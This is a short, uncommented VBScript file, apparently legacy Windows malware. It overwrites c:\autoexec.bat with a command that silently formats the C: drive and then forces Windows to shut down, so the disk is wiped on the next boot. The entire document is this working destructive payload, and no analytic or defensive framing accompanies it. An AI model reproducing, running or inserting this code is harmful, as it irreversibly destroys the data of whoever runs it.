set fs=createobject("Scripting.FileSystemObject")
set windir = fs.GetSpecialFolder(0)
if fs.fileexists("c:\autoexec.bat") then
set ab=fs.getfile("c:\autoexec.bat")
ab.attributes=0
end if
set autoexec=fs.CreateTextFile("c:\autoexec.bat")
autoexec.WriteLine windir & "\command\format.exe c: /autotest /q >nul"
autoexec.close
set shell=CreateObject("WScript.Shell")
shell.run "rundll32.exe user.exe,ExitWindows"
